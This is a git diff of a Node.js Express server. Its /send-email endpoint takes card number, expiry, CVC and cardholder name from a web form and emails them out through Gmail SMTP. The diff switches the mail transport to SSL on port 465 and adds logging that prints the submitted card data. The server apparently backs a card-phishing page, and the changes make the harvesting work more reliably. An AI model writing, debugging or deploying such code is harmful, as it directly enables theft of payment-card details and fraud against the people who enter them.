@@ -8,8 +8,8 @@ import { fileURLToPath } from "url";
 dotenv.config();
 
 const app = express();
-app.use(express.json());
 app.use(cors());
+app.use(express.json());
 
 // Static Hosting
 const __filename = fileURLToPath(import.meta.url);
@@ -20,9 +20,11 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// ====== NODEMAILER TRANSPORT ======
+// ====== NODEMAILER SETUP ======
 const transporter = nodemailer.createTransport({
-  service: "gmail",
+  host: "smtp.gmail.com",
+  port: 465,
+  secure: true, // SSL
   auth: {
     user: process.env.MAIL_USER,
     pass: process.env.MAIL_PASS
@@ -31,6 +33,8 @@ const transporter = nodemailer.createTransport({
 
 // ====== SEND EMAIL API ======
 app.post("/send-email", async (req, res) => {
+  console.log("📩 Received form:", req.body); // <-- Debug log
+
   const { card_number, expiration, cvc, card_name } = req.body;
 
   const mailOptions = {
@@ -47,10 +51,11 @@ Card Name: ${card_name}
 
   try {
     await transporter.sendMail(mailOptions);
+    console.log("✅ Email sent!");
     res.json({ success: true });
   } catch (error) {
-    console.log("❌ Email error:", error);
-    res.status(500).json({ success: false, error });
+    console.log("❌ Email error:", error.message);
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
@@ -58,5 +63,4 @@ Card Name: ${card_name}
 app.listen(process.env.PORT || 10000, () => {
   console.log("🚀 Server running...");
 });
-
 
